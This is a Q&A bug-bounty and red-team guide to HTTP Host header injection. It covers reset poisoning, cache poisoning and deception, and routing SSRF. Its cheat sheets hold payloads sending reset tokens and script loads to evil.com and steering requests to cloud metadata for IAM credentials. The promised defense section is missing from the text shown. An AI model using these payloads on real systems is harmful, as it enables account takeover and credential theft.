# HTTP Host Header Injection — Zero to Expert (Q&A, Bug-Bounty / Red-Team Edition)

> A complete, in-depth study + field reference for **HTTP Host header attacks** — from "what is the Host header" to
> password-reset poisoning, web-cache poisoning, web cache deception, routing-based SSRF, and RCE chains. Q&A format,
> progressive difficulty. Covers the spoofing-header family, validation bypasses, every sink (reset links / redirects /
> cache / vhost routing / SSO), exploitation, tooling, methodology, real-world patterns, **and** defense.
>
> ⚖️ **Authorized use only.** Bug bounty (in-scope), sanctioned pentests, CTFs, and learning. Use **your own** test
> accounts for reset-poisoning, **benign markers on a non-shared cache key** for poisoning, your **own** OOB host for
> routing SSRF, and validate cloud creds **read-only**. Never test systems you don't have written permission to test.

**Canonical references** (cited throughout — real and worth reading in full):
- PortSwigger Web Security Academy — *HTTP Host header attacks* and *Web cache poisoning*; James Kettle's research ("Practical Web Cache Poisoning", "Cracking the lens")
- Omer Gil — *Web Cache Deception Attack*
- OWASP — Host header injection (WSTG) · PayloadsAllTheThings — Request smuggling/Host header · HackTricks — *Host header injection* & *Cache poisoning/deception*
- CWE-644 (Improper Neutralization of HTTP Headers) · CWE-640 (Weak Password Recovery) · CWE-444/CWE-349 · CWE-918
- Companion kit in this repo: `Web/HostHeader/` (guide + arsenal + checklist + report template + `poc/`)

---

## TABLE OF CONTENTS
- **Level 0 — Fundamentals** (Q1–Q10)
- **Level 1 — Recon & baseline** (Q11–Q18)
- **Level 2 — Spoofing the host & bypassing validation** (Q19–Q32)
- **Level 3 — Password-reset poisoning & redirect/link poisoning** (Q33–Q44)
- **Level 4 — Web cache poisoning & web cache deception** (Q45–Q60)
- **Level 5 — Routing SSRF, path-override, SSO & expert chains** (Q61–Q78)
- **Tooling** (Q79–Q83)
- **Black-box methodology & checklist** (Q84–Q87)
- **Cheat sheets** (Q88–Q92)
- **Real-world patterns & references** (Q93–Q95)
- **Defense — securing the Host header** (Q96–Q100)

---

# LEVEL 0 — FUNDAMENTALS

### Q1. What is the HTTP Host header and why is it security-relevant?
Every HTTP/1.1 request carries a `Host:` header naming the site the client wants (it lets one IP serve many vhosts). Frameworks expose it (`request.host`, `$_SERVER['HTTP_HOST']`) and developers often **reuse it** to build absolute URLs (password-reset links, redirects), to **key caches**, or to **route** to a backend. Because the **client fully controls** the header, trusting it for any of those is the bug.

### Q2. What is "Host header injection," in one line?
Sending a `Host` (or a forwarding header like `X-Forwarded-Host`) the application trusts, so that an attacker-controlled host value lands in a **security-sensitive sink** — a victim's reset email link, a cached response served to everyone, a backend route, or an absolute redirect.

### Q3. Why does it pay so well in bug bounty?
Three reasons: **(a)** password-reset poisoning is a low-precondition **account takeover**; **(b)** web-cache poisoning turns **one** request into **mass** impact (stored XSS/redirect for every visitor); **(c)** routing-based SSRF turns a header into a **perimeter break** (internal services / cloud metadata → cloud takeover). A header everyone can set, trusted by the backend, reaches all of these.

### Q4. What are the sinks that matter (and their impact ceiling)?
```
reset/verify EMAIL link from host   → password-reset poisoning → ATO        (High; Critical if no click)
host reflected + response cached     → web-cache poisoning → mass XSS/redirect (High–Critical)
host selects the backend (routing)   → routing-based SSRF → internal/metadata → RCE/cloud (Critical)
host in absolute redirect/canonical  → open redirect / phishing / OAuth-token theft (Medium–High)
host reflected unencoded in HTML     → reflected XSS (Medium–High; stored if cached)
host gates access/tenant/logic        → authz bypass / cross-tenant (Medium–High)
host reflected, NO security use       → Low/Info (not a finding alone)
```

### Q5. Which headers can influence the "effective host"?
`Host` (primary; may be validated), and the family proxies trust: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`, `X-Original-Host`, `Forwarded: host=…`, an **absolute URI in the request line** (`GET https://evil.com/ HTTP/1.1`), and a **duplicate Host** header. Plus the related forwarding headers with their own sinks (Q31): `X-Forwarded-Scheme/Proto/Port`, `X-Original-URL`/`X-Rewrite-URL`.

### Q6. What's the #1 mistake — the "reflection vs sink" rule?
Reporting "the Host header is reflected." **Reflection is a condition, not impact.** It matters only when the reflected/trusted host reaches a sink and produces harm: a poisoned reset email (ATO), a cached payload served to others (mass XSS/redirect), an internal/metadata fetch (SSRF). A bare reflected/accepted header is **Low/Info**.

### Q7. Why can't I just spoof the Host in a browser?
Browsers set `Host` automatically and won't let JavaScript spoof it. You tamper it in **Burp/curl**. (That's also why the *delivery* differs per sink: reset-poisoning needs the victim to trigger a reset; cache poisoning is server-side and then served to victims; routing SSRF is your own request.)

### Q8. Does `X-Forwarded-Host` really get trusted even when `Host` is validated?
Very often, yes. Apps validate `Host` against an allowlist but then build links/cache keys from `X-Forwarded-Host` (because that's what the framework exposes behind a proxy). **It's the single most productive bypass** — always test it with a *valid* `Host`.

### Q9. Why does HTTP/2 change the picture slightly?
In HTTP/2 the host is the `:authority` pseudo-header. Tooling must set that; and `:authority` vs a separate `Host` can disagree (overlaps with request smuggling). The same trust bugs apply — just set `:authority`/`Host` in your client accordingly.

### Q10. What's the minimum to learn before testing?
How to set `Host`/forwarding headers in Burp/curl; how to read where the host **lands** (response body, `Location`, canonical/og links, the **email** you receive, a different backend); the difference between **reflected** (you see it) and **trusted** (used server-side, e.g. in an email or routing); and cache indicators (`Age`, `X-Cache`, `Cache-Control`, `Vary`).

---

# LEVEL 1 — RECON & BASELINE

### Q11. Which features should I hunt for first?
**Password-reset / email-verify / invite / magic-link** flows (they build a URL from the host) — the top target. Then: absolute redirects (post-login/logout/SSO), canonical/og:url tags, **cacheable pages behind a CDN** (look for `X-Cache`/`Age`), **multi-tenant/vhost routing**, SSO/OAuth callbacks, and any page that **reflects** the host.

### Q12. How do I baseline whether I can influence the host?
Send `Host: evil.com` — accepted (200) or rejected (400/redirect-to-canonical)? Is `evil.com` reflected anywhere? Then send `X-Forwarded-Host: evil.com` with a *valid* `Host` — reflected/used? Also try appending to a valid host (`Host: target.com.evil.com`, `Host: target.com:evil.com`). Watch the body, `Location`, links, and (later) the email.

### Q13. How do I classify what I can do from the baseline?
```
Host fully controllable + reaches a sink          → straight to the matching impact.
Host validated but X-Forwarded-Host trusted        → use the forwarding header → sink.
Host reflected only in a cacheable response        → cache poisoning.
Host used to BUILD links (reset/redirect)          → reset/redirect poisoning.
Host used to ROUTE                                  → routing SSRF.
Host reflected but no security use                  → likely Low/Info — keep looking.
```

### Q14. Reflected vs trusted — why does the distinction matter?
**Reflected** = you can see the host in the response (body/redirect/links) → XSS / cache / redirect angles. **Trusted** = you *don't* see it but it's used server-side → it's in an **email** (reset-poisoning — you only see it in the inbox) or in **routing** (you see a different/internal backend, or an OOB hit). Different sinks need different confirmation.

### Q15. How do I find host-dependent sinks at scale?
Inject `X-Forwarded-Host: <unique>` across traffic (Burp Match-and-Replace) and grep responses/links for it; trigger the reset flow and read the email; check cache headers on every page; flip the `Host` to an internal name and watch for different content / an OOB hit. The kit's `poc/hosthdr_probe.py` automates the reflection/cacheability part.

### Q16. What if `Host: evil.com` is rejected with a 400 or a canonical redirect?
That's the app **defending** correctly for `Host` — but it's **not** the end. Try `X-Forwarded-Host` (often still trusted), duplicate-Host, absolute-URI, line-wrapping, and weak suffix/prefix matches (Level 2). Many "validated" apps still trust a forwarding header.

### Q17. Do I need to test subdomains/services separately?
Yes — `api.`, `app.`, `admin.`, and any reverse-proxied service may have its own Host handling and its own cache. The reset flow on one host and the cache on another can each be independently vulnerable.

### Q18. What's the deliverable from baseline?
A per-sink verdict: *which* host I can control (via which header), *where* it lands, and *which* sink it reaches — so I know whether to chase reset-poisoning, cache poisoning, routing SSRF, or a redirect, and which bypass I still need.

---

# LEVEL 2 — SPOOFING THE HOST & BYPASSING VALIDATION

### Q19. What's the full spoofing-header set to try?
```
Host: evil.com
X-Forwarded-Host: evil.com        X-Host: evil.com        X-Forwarded-Server: evil.com
X-HTTP-Method-... no; use:  X-HTTP-Host-Override: evil.com    X-Original-Host: evil.com
Forwarded: host=evil.com
GET https://evil.com/path HTTP/1.1   (absolute URI in the request line)
Host: target.com  +  a second  Host: evil.com   (duplicate Host)
```
Send each alone, then in combinations; keep a **valid** `Host` when testing forwarding headers so the request still routes.

### Q20. How do duplicate Host headers bypass validation?
Send **two** `Host` headers. The front-end/validator may read the **first** while the backend uses the **second** (or vice-versa) — a parser-discrepancy. So `Host: target.com` (passes validation) + `Host: evil.com` (used by the app) can poison the sink.

### Q21. The absolute-URI trick?
`GET https://evil.com/path HTTP/1.1` puts the host in the **request line**. Some stacks derive the effective host from the absolute URI rather than the `Host` header — so this overrides a validated `Host`.

### Q22. Line-wrapping / indentation tricks?
A folded/indented header (`Host: target.com\r\n Host: evil.com`, or `Host:` with leading whitespace/tab) can be parsed differently by the front-end vs the backend (overlaps with request smuggling). Test raw via Burp with exact bytes.

### Q23. Weak allowlist matching — what origins satisfy each flaw?
```
"endsWith target.com"   → Host: nottarget.com  ·  eviltarget.com
"contains target.com"   → Host: target.com.evil.com  ·  Host: evil.com (X-Forwarded-Host: target.com.evil.com)
"startsWith target.com" → Host: target.com.evil.com
trailing dot / case      → Host: target.com.  ·  Host: TARGET.com
port / userinfo          → Host: target.com:@evil.com  ·  Host: target.com@evil.com  ·  Host: evil.com:80
```

### Q24. SNI vs Host mismatch?
When the front-end routes on the TLS **SNI** but the app trusts the `Host` header, set a valid SNI (so you reach the right front-end) and an evil/internal `Host` (which the app then trusts) — a routing/validation split.

### Q25. What is `X-Forwarded-Host` and why is it the go-to bypass?
It's the header proxies use to tell the backend the original host. Frameworks frequently prefer it over `Host` for building URLs/links. So even a strict `Host` allowlist is bypassed if the app reads `X-Forwarded-Host` — the most common real-world Host-injection.

### Q26. When the host is *trusted* (not reflected), how do I confirm the bypass worked?
You won't see it in the response. Confirm via the **sink**: trigger the reset and read the email link (reset-poisoning), or flip the host to an internal name/OOB host and watch for **different backend content** or a **DNS/HTTP hit from the front-end** (routing).

### Q27. Does the `Forwarded` header (RFC 7239) work?
Sometimes — `Forwarded: host=evil.com` is the standardized form some proxies honor. Test it alongside `X-Forwarded-Host`; apps vary in which they read.

### Q28. What about case, trailing dots, and normalization?
A weak normalizer can accept `TARGET.com`, `target.com.` (trailing dot), or odd ports. These slip allowlists that compare strings naively. Try them when exact-match seems in place but you suspect sloppy normalization.

### Q29. How do I know which header the app actually uses?
Inject **different unique values** in `Host`, `X-Forwarded-Host`, `X-Host`, etc., and see **which one appears** in the sink (the email link / the reflected value / the routed backend). That tells you exactly which header to weaponize.

### Q30. The end-state of Level 2?
An attacker-controlled host (or internal host) reaches the target **sink** despite any validation — via the header the app trusts. Now exploit the sink (Levels 3–5).

### Q31. What are the *related* forwarding headers, and why test them too?
Beyond the host, proxies trust a family with **distinct sinks**: `X-Forwarded-Scheme`/`X-Forwarded-Proto` (force `http` → scheme-downgraded links/redirects, redirect loops), `X-Forwarded-Port` (port lands in absolute links → SSRF/redirect), `X-Original-URL`/`X-Rewrite-URL`/`X-Override-URL` (override the **path** after the proxy's ACL ran → reach `/admin`/internal = **auth bypass**), and `X-Forwarded-For`/`True-Client-IP`/`X-Real-IP` (spoof source IP → IP-allowlist/rate-limit bypass, log spoofing, SSRF if fetched).

### Q32. What's the X-Original-URL path-override bug specifically?
A front-end proxy applies access control to the **requested path** (e.g., blocks `/admin`), then forwards to an app that **re-derives** the path from `X-Original-URL`/`X-Rewrite-URL`. Send `GET /home` + `X-Original-URL: /admin` → the proxy's ACL ran on `/home` but the app serves `/admin` → **ACL/auth bypass** to admin/internal endpoints.

---

# LEVEL 3 — PASSWORD-RESET POISONING & REDIRECT/LINK POISONING

### Q33. What is password-reset poisoning (the headline bug)?
If the reset email's link is **built from the request host**, set `Host`/`X-Forwarded-Host: evil.com`, trigger a reset for the victim, and the email links to `evil.com/reset?token=...`. When the victim clicks their reset link, **their browser sends the token to evil.com** → you set their password → **account takeover**.

### Q34. How do I confirm and exploit it safely?
On **your own** test account: request a reset with the spoofed host, read **your** email, and check whether the link host is `evil.com`. That proves poisoning without touching a real user. For the report, show the email link pointing to your host and the token arriving there (redacted).

### Q35. What's the strongest reset-poisoning variant?
A **server-side token callback** — the app *fetches* the host (or emails/sends the token to it) **without a victim click** → silent ATO (Critical). Also strong: when the reset page itself loads resources from the host (the token leaks via Referer to your host on page load).

### Q36. What if only *part* of the URL is host-derived (dangling markup)?
If the host is concatenated into the middle of the link, inject **dangling markup** so the token gets captured: e.g. a host like `evil.com/?` or `evil.com"><img src='//evil.com/?` so the rest of the link (including the token) is sent to you. Useful when you can't fully control the link host.

### Q37. The reset link uses a fixed configured domain — is it still a bug?
No — if the link host is a **server-configured constant** (not derived from the request), poisoning fails. That's the correct defense. Confirm the link host actually equals your spoofed `Host`/`X-Forwarded-Host` before reporting.

### Q38. What's the impact and severity?
**ATO** of any user whose reset you can trigger and who clicks the link → **High**; **Critical** when no click is needed (server-side callback) or when combined with a silent token-capture. CWE-640 (weak password recovery) + CWE-644.

### Q39. What is absolute-redirect / link poisoning?
If a redirect (post-login/logout/SSO), canonical tag, or og:url is built from the host, set `Host: evil.com` → the app redirects/links to `evil.com` → **open redirect / phishing / SEO poisoning**. On its own Medium; it climbs when it leaks a token or seeds the reset/OAuth chain.

### Q40. How does scheme-downgrade (X-Forwarded-Proto) chain in?
`X-Forwarded-Proto: http` on an HTTPS site makes the app build `http://` links/redirects → downgrade, sometimes a redirect loop (DoS), and it weakens reset/SSO links. Combine with a cache (to serve the downgraded link to all) or an open redirect.

### Q41. Reflected-host XSS — when does it happen?
If the host is reflected **unencoded** into HTML/JS: `Host: evil.com"><script>alert(document.domain)</script>`. That's XSS sourced from a header. If the reflecting page is **cached**, it becomes **stored** XSS for all users (Level 4) — far more severe.

### Q42. Why is reset-poisoning "the money bug" — test it first?
Because it's a direct, low-precondition **account takeover** and it's extremely common (Django ALLOWED_HOSTS misconfig, custom mailers, Rails/Laravel apps). One spoofed header on the forgot-password endpoint, read your own email, and you often have ATO.

### Q43. What proof do I capture for a reset-poisoning report?
The forgot-password request with the spoofed `Host`/`X-Forwarded-Host`, the resulting **email link** pointing to your host (own account, token redacted), and the token arriving at your collector. State the impact (ATO of any user) and that it was demonstrated with your own account.

### Q44. Can OAuth/SSO callbacks be poisoned via Host?
Yes — if the `redirect_uri`/callback is **derived from the host**, Host injection delivers the **auth code/token to your domain** → ATO (cross-ref the JWT/CORS kits for using the stolen code/token). Pre-registered redirect URIs are the fix.

---

# LEVEL 4 — WEB CACHE POISONING & WEB CACHE DECEPTION

### Q45. What is web-cache poisoning via the Host header?
If a Host/`X-Forwarded-Host` value is **reflected** in a response **and** the response is **cacheable** **and** the header is **unkeyed** (the cache key ignores it), you send one poisoned request → the cache stores your variant → it's served to **every** subsequent visitor. Store an XSS or a malicious redirect → mass compromise.

### Q46. What is a "cache key" and what does "unkeyed" mean?
The cache decides which stored response to serve by a **cache key** — usually method + host + path + (some) query + a few headers. Any input that **changes the response but is NOT in the key** is **unkeyed**. An unkeyed input under attacker control is the poisoning primitive: your variant is served to victims whose request matches the same key.

### Q47. How do I find unkeyed inputs?
Burp **Param Miner** ("guess headers"/"guess params"). The classic unkeyed set: `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Scheme`, `X-Forwarded-Proto`, `X-Forwarded-Port`, `X-Forwarded-Server`, `X-Original-URL`/`X-Rewrite-URL`, custom app headers, sometimes a cookie or an unkeyed query param.

### Q48. What is the cache-buster discipline (so I don't harm real users)?
Always test poisoning with a **unique cache-buster** (`?cb=<rand>`) so you only poison **your** key, never a real shared page. Prove the technique on the benign key, then **describe** the shared-key impact. Don't poison a high-traffic page (§ ethics).

### Q49. How do I confirm a poisoning is real?
Send the poison (with `?cb=`), then a **clean** request to the **same keyed URL** (no poison header). If your payload is served back **from cache** (`X-Cache: hit` / `Age`), the input is unkeyed + cacheable = poisonable. The `Vary` header tells you which headers are keyed (missing `Vary: X-Forwarded-Host` is the tell).

### Q50. What payloads do I store via cache poisoning?
A reflected, unencoded host → `X-Forwarded-Host: a."><script src=//evil.com/x.js></script>` → **stored XSS** for all who get the cached page. Or `X-Forwarded-Host: evil.com` → cached **absolute links/redirects** point at evil.com → **mass redirect/phishing**. Or scheme-downgrade for a downgrade-to-http loop.

### Q51. What are cache-key normalization flaws and "fat GET"?
**Normalization:** the cache key normalizes oddly (case, port, trailing slash, %-decoding) so your malicious request **collapses onto a victim's key**. **Fat GET / parameter cloaking:** a request body or duplicate param the **cache ignores** but the **origin honors** → you poison the keyed URL with content the cache didn't account for.

### Q52. What is *internal* cache poisoning?
Even a reflected value that seems "unexploitable" externally can poison an **internal** cache the app reuses (e.g., a fragment cache, an API response cache) → the bad value propagates to other users via that internal layer. Worth checking when the edge cache looks safe.

### Q53. Now the twin: what is Web Cache Deception (WCD)?
The mirror of poisoning. Instead of poisoning a public page, you trick the cache into **storing a victim's PRIVATE, authenticated response under a URL you can read**. No Host header needed — it's a **path/extension confusion**: the origin returns the same private page for `/account` and `/account/x.css`, while the cache caches `*.css` **regardless of auth**.

### Q54. Walk a WCD attack.
```
1. Cache rule: "always cache *.css/*.js/*.jpg" (ignores auth).
2. Origin ignores a trailing segment: /account/info  and  /account/info/x.css  → SAME private page.
3. Victim (or you, luring them) requests /account/info/x.css → the cache stores their private response.
4. You request /account/info/x.css yourself (no cookie) → you read the VICTIM's cached private data (PII/token/CSRF token).
```
Variants: `;x.css`, `%2Fx.css`, `?x.css`, encoded delimiters — any "static-looking" suffix the origin tolerates.

### Q55. How do I test WCD safely?
With **your own** account: request your authenticated page with a static suffix (`/x.css`), confirm the response is your private page **and** is **cached** (`Age`/`X-Cache: hit`) **and** readable **without** your cookie (fresh/incognito session). If all three hold → WCD. Prove with your own data; never harvest real users. (Kit: `poc/wcd_test.py`.)

### Q56. WCD vs cache poisoning — what's the difference?
**Poisoning:** attacker *writes* a malicious response into the cache for a *public* URL → served to many. **Deception:** attacker *reads* a *victim's private* response that the cache wrongly stored → data theft. Poisoning = integrity/mass-XSS; deception = confidentiality/data leak. Both stem from cache rules ignoring something they shouldn't.

### Q57. What's the severity of cache poisoning / WCD?
Poisoning → **High–Critical** (mass stored XSS → ATO of all visitors; mass redirect). WCD → **High–Critical** (read other users' PII/tokens). Both can also be a **DoS** (poison the cache with a broken response, or with a redirect loop). CWE-444/CWE-349 (cache) + CWE-79 (XSS) / CWE-200 (WCD).

### Q58. How do I avoid harming real users while testing caches?
Cache-buster for poisoning (unique key). For WCD, use **your own** account and a fresh session to confirm the leak. Never poison a real high-traffic page or read another user's cached content. Describe the shared impact rather than triggering it broadly.

### Q59. What makes cache findings get rejected (FP)?
"Cache poisoning" with **no proof of caching** (`Age`/`X-Cache`) or no proof the input is **unkeyed** → not actually served to others. Self-only effects. A reflected header that's actually **keyed** (so your variant is never served to anyone else). Always prove served-from-cache to a *different* (or clean) request.

### Q60. Can I chain cache poisoning to ATO?
Yes — a **cache-poisoned stored XSS** that lands in an **admin/support** session → admin actions / token theft → privilege escalation or ATO. Mass stored XSS to all users → mass ATO. That's the high end of cache poisoning.

---

# LEVEL 5 — ROUTING SSRF, PATH-OVERRIDE, SSO & EXPERT CHAINS

### Q61. What is routing-based SSRF via the Host header?
On some front-ends the `Host` header decides **which backend** the request is routed to. Change it to an internal name/IP and you reach **internal-only** vhosts/services — sometimes cloud metadata. James Kettle's "Cracking the lens": the Host header is an SSRF primitive.

### Q62. How do I test/exploit routing SSRF?
Set `Host: localhost` / `127.0.0.1` / `169.254.169.254` / `internal-admin` / `<internal-vhost>` (or via `X-Forwarded-Host`/absolute URI) and watch for **different/internal content** or an **OOB hit** (`Host: YOURID.oast.pro` → a DNS/HTTP hit from the front-end confirms routing reach). Steer to `169.254.169.254` for **cloud metadata → IAM creds → cloud takeover** (hand to the SSRF kit).

### Q63. How does Host injection reach RCE?
Through what it reaches/takes over:
- **Routing SSRF → cloud metadata** IAM creds → a cloud run-command/SSM surface → **shell**.
- **Routing SSRF → internal admin/unauth service** with a code-exec feature (deploy/import/template) → RCE.
- **Routing SSRF → internal Redis/gopher-reachable service** → RCE.
- **Cache-poisoned stored XSS → admin session** → admin "run code"/template feature → web shell.
- **Reset-poisoning → admin ATO** → admin code-exec feature → RCE.
Always ask "does the internal target or hijacked account let me run a command?"

### Q64. What's the path-override (X-Original-URL) auth bypass?
The proxy enforces ACLs on the **requested** path but the app re-derives the path from `X-Original-URL`/`X-Rewrite-URL`. `GET /home` + `X-Original-URL: /admin` → the proxy's check ran on `/home`, the app serves `/admin` → reach restricted/internal endpoints (then exploit what's there → §63).

### Q65. Host-based authorization bypass?
Some apps trust a privileged **vhost** purely on the `Host` header ("if Host == admin.internal, allow"). Spoof it → reach admin functionality. Also multi-tenant apps that select the **tenant** from the host → cross-tenant data access (IDOR-like).

### Q66. How does Host injection chain with subdomain takeover?
If routing or a cache trusts `*.target.com` and you have a **dangling subdomain** (takeover), you control a trusted host → host content there, or satisfy a host check, to reach the sink. (More central to CORS, but applies to host-trust here too.)

### Q67. Chain: Host → SSO/OAuth token theft.
If the OAuth callback/`redirect_uri` is built from the host, Host injection delivers the **auth code/token to your domain** → exchange it → ATO (JWT/CORS kits).

### Q68. Chain: scheme-downgrade → MITM/strip.
`X-Forwarded-Proto: http` makes the app emit `http://` links/redirects; combined with a network position or a cache, you can strip TLS / force users to an attacker page. Lower-frequency but real where the app trusts the proxy scheme.

### Q69. How do I confirm a *blind* routing SSRF?
`Host: <id>.oast.pro` (or `X-Forwarded-Host`) → a DNS/HTTP hit at interactsh **from the front-end/server IP** proves the host steered a server-side request. Then steer to internal/metadata for impact.

### Q70. What's the relationship to HTTP request smuggling?
Host/`:authority` disagreement, duplicate-Host, and line-wrapping overlap with smuggling (front-end vs back-end parsing). A Host-routing quirk can sometimes be escalated via smuggling to reach internal endpoints (Request-Smuggling kit). Keep both in mind on chained front-ends.

### Q71. Chain: Host injection → internal admin → RCE (full).
`Host: internal-admin` (routing SSRF) returns an internal admin panel that lacks external auth → use its import/deploy/template feature → web shell. Demonstrate the shell on your **own** tenant; validate any creds read-only; stop at proof.

### Q72. Chain: routing SSRF → metadata → cloud takeover.
`Host: 169.254.169.254` → IAM creds → `aws sts get-caller-identity` (read-only proof) → cloud-account compromise. Stop at `get-caller-identity` for the report (SSRF-kit discipline).

### Q73. How do I escalate a "weak" Host finding into something that pays?
Reflected host → check **cacheable** (poisoning) or **unencoded** (XSS). Accepted `X-Forwarded-Host` → drive it into the **reset email** (ATO) or the **cache**. Routing change → push to **internal/metadata** (SSRF→RCE). Path-override → reach **/admin**. Always chase the sink, not the header.

### Q74. What's the role of `Vary: Origin`/`Vary: X-Forwarded-Host`?
For cache safety, the response should `Vary` on any header that changes it. **Missing `Vary`** on a reflected host header is exactly what makes poisoning possible (the cache serves one variant to everyone). Its absence is a tell; its presence (correctly) blocks poisoning.

### Q75. Can Host injection cause DoS?
Yes — poison the cache with a **broken/redirect-loop** response (e.g., scheme-downgrade loop) for a popular URL → the app's pages break for all users; or a routing quirk that errors. Report at the appropriate severity.

### Q76. What's the difference between Host-header SSRF and a normal SSRF param?
A normal SSRF param is *meant* to take a URL; Host-routing SSRF abuses the **infrastructure routing** layer (the front-end picks a backend by host). It often reaches **internal vhosts** a param-SSRF can't, and it's frequently missed because the Host header isn't thought of as "user input."

### Q77. How do I pick which sink to chase when several apply?
By impact ceiling: **routing SSRF → metadata/RCE (Critical)** ≈ **cache poisoning → mass XSS / WCD data theft (High–Critical)** > **reset-poisoning → ATO (High)** > **redirect/SSO token theft (High)** > **reflected XSS (Medium–High)** > **open redirect (Medium)**. Lead with the highest you can demonstrate.

### Q78. What separates expert Host-header testing from beginner?
The expert (1) ignores bare reflection and chases the **sink**; (2) always tests **`X-Forwarded-Host`** and the related forwarding family (`X-Forwarded-Scheme/Port`, `X-Original-URL`); (3) understands **cache keying** (unkeyed inputs, cache-buster) and tests the **WCD** twin; (4) treats Host as a **routing SSRF** primitive (→ metadata/RCE); (5) **chains** to ATO/RCE; and (6) proves it with own accounts + benign markers on non-shared keys.

---

# TOOLING

### Q79. Core Host-header toolkit?
- **Burp/Caido** (Repeater to set `Host`/forwarding headers; Match-and-Replace to inject `X-Forwarded-Host` everywhere; **Param Miner** for unkeyed inputs; raw HTTP/1 for duplicate-Host/line-wrap).
- **curl** for quick probes.
- **interactsh / Burp Collaborator** for routing-SSRF OOB + reset-link callbacks.
- **A domain you control + a mailbox** to host the poisoned link / receive your own reset token.
- The kit's `poc/`: `hosthdr_probe.py`, `reset_poison.py`, `cache_poison.py`, `wcd_test.py`.

### Q80. How do I use Param Miner here?
Run "Guess headers" / "Guess GET parameters" on a cacheable response to discover **unkeyed** inputs (the cache-poisoning primitive). It also flags cache-key normalization quirks. Combine with a cache-buster so you don't poison shared pages.

### Q81. How do I prove a routing SSRF with OOB?
Set `Host: <unique>.oast.pro` (or `X-Forwarded-Host`) and watch interactsh for a DNS/HTTP hit **from the front-end IP**. That proves the host steered a server-side request even with no visible response; then steer to internal/metadata.

### Q82. How do I avoid false positives with tooling?
Only report when the **sink impact** is demonstrated: a poisoned **email link** (own account), a payload **served from cache** to a clean request, a **WCD** page readable unauthenticated (own account), or **internal/metadata** content/OOB. "Accepted X-Forwarded-Host" with no observable effect is not a finding.

### Q83. What's the fastest workflow?
1. Inject `X-Forwarded-Host: <unique>` across traffic; grep responses/links/email for it. 2. On any cacheable page, run Param Miner + a cache-buster. 3. Trigger reset with the spoofed host; read your email. 4. Flip `Host` to internal/OOB and watch for routing reach. 5. Test WCD suffixes on authenticated pages. 6. Chase the highest sink and prove it.

---

# BLACK-BOX METHODOLOGY & CHECKLIST

### Q84. Step-by-step methodology.
1. **Recon** host-dependent sinks (reset/verify links, redirects, cacheable pages, routing, SSO).
2. **Baseline**: can I influence the effective host (Host / X-Forwarded-Host / dup / absolute URI)? where does it land?
3. **Bypass** any Host validation; also test the related forwarding headers (scheme/port/path).
4. **Exploit the sink**: reset-poisoning → ATO · cache poisoning + WCD · routing SSRF → internal/metadata · redirect/SSO.
5. **Chain** to RCE/cloud where the reached target or hijacked account allows.
6. **Report**: own accounts, benign markers on non-shared keys, impact-led, deduped per root cause.

### Q85. Quick triage decision tree.
- Reset email link host == request host/XFH → **reset-poisoning → ATO** (High; Critical if no click).
- Reflected ACAO... no — reflected host + cacheable + **unkeyed** → **cache poisoning** (High–Critical).
- Authenticated page cached + readable unauth via `/x.css` → **Web Cache Deception** (High–Critical).
- Changing Host → different/internal backend or OOB hit → **routing SSRF** (Critical; → RCE/cloud).
- `X-Original-URL` overrides the path past the ACL → **auth bypass** to /admin/internal.
- Host in absolute redirect/OAuth callback → **open redirect / token theft**.
- Reflected host, no sink → **Low/Info**.

### Q86. False positives / auto-reject.
- "Host header is reflected" with no security sink.
- `X-Forwarded-Host` merely **accepted** with no observable effect.
- `Host: evil.com` → 400/canonical redirect (app defending) and no bypass reaches a sink.
- Reset link uses a **fixed configured domain** (not host-derived).
- "Cache poisoning" with no proof of caching (`Age`/`X-Cache`) or that the input is unkeyed.
- Self-only effect (no shared/cross-user impact).

### Q87. What makes a great Host-header report?
Title names the **impact** (e.g., "Host header injection → password-reset poisoning → account takeover"), CWE-644 (+ CWE-640/79/918 by outcome), the exact endpoint + which header (Host/X-Forwarded-Host/…) + the sink, the evidence (poisoned **email link** own-account / payload **served from cache** / **WCD** unauth read / **internal/metadata** content or OOB), the realized impact, remediation, and one-finding-per-root-cause.

---

# CHEAT SHEETS

### Q88. Spoofing-header cheat sheet.
```
Host: evil.com · X-Forwarded-Host: evil.com · X-Host: evil.com · X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com · X-Original-Host: evil.com · Forwarded: host=evil.com
absolute URI:  GET https://evil.com/path HTTP/1.1   ·   duplicate Host (two Host headers)
weak allowlist:  target.com.evil.com · eviltarget.com · nottarget.com · target.com. · TARGET.com · target.com:@evil.com
```

### Q89. Related forwarding-headers cheat sheet (own sinks).
```
X-Forwarded-Scheme: http / X-Forwarded-Proto: http   → downgrade links/redirects (chain cache/open-redirect)
X-Forwarded-Port: 1337                                → port in absolute links → SSRF/redirect
X-Original-URL: /admin / X-Rewrite-URL: /admin        → path override past the proxy ACL → auth bypass to /admin
X-Forwarded-For / True-Client-IP / X-Real-IP: 127.0.0.1 → IP-gate / rate-limit bypass, log spoof, SSRF if fetched
```

### Q90. Reset-poisoning cheat sheet.
```
POST /api/forgot-password    Host: target.com    X-Forwarded-Host: evil.com    {"email":"you@yourdomain.com"}
→ read YOUR email: link host == evil.com? → poisoning → ATO
dangling-markup partial host:  X-Forwarded-Host: evil.com/?    or    evil.com"><img src='//evil.com/?
```

### Q91. Cache poisoning / WCD cheat sheet.
```
POISON: GET /?cb=UNIQUE  + X-Forwarded-Host: a."><script src=//evil/x.js></script>  → reflected + Age/X-Cache:hit + no Vary
        confirm: clean GET same keyed URL → payload served from cache. Param Miner finds the unkeyed header.
WCD:    GET /account/info/x.css (with cookie) → private page + cached ; then (no cookie) → reads it = deception
        variants: /x.js /x.jpg ;x.css %2Fx.css ?x.css
```

### Q92. Routing-SSRF cheat sheet.
```
Host: localhost / 127.0.0.1 / 169.254.169.254 / internal-admin / <internal-vhost> / <id>.oast.pro
(also via X-Forwarded-Host / absolute URI) → different/internal content or OOB hit from the front-end
169.254.169.254 → IAM creds → aws sts get-caller-identity (read-only) → cloud takeover (SSRF kit)
```

---

# REAL-WORLD PATTERNS & REFERENCES

### Q93. Recurring real-world Host-header wins.
- **Password-reset poisoning → ATO** (Django ALLOWED_HOSTS misconfig; Rails/Laravel/custom mailers) — the classic.
- **Server-side reset-token callback** → silent ATO (no click).
- **X-Forwarded-Host trusted behind a CDN** even when `Host` is validated — the universal bypass.
- **Web-cache poisoning** via unkeyed `X-Forwarded-Host`/`X-Forwarded-Scheme` → mass stored XSS/redirect (Kettle's research).
